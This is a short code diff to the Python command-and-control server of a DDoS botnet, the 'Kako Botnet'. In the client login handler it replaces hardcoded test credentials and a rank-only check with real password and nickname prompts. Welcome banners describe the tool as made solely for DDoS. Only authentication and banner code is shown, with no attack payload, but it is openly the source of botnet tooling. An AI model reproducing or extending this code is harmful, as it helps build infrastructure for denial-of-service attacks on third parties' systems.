@@ -57,12 +57,9 @@ def clientThread(conn, addr):
 		return conn.recv(512)
 
 	rank = rank(conn)
-	#password = password(conn)
-	#nickname = nickname(conn)
-	password = "Password"
-	nickname = "Law"
-	#if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
-	if rank.startswith(rankAdmin) or rank.startswith(rankGuest):
+	password = password(conn)
+	nickname = nickname(conn)
+	if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
 		conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 		conn.sendall("[>] Made solely for DDoS but that depends on your bot [<]\r\n")
 		conn.sendall("[!] If you do anything I, Law, disapprove of I will not hesitate to ban your IP Address. Everything is logged.\r\n")
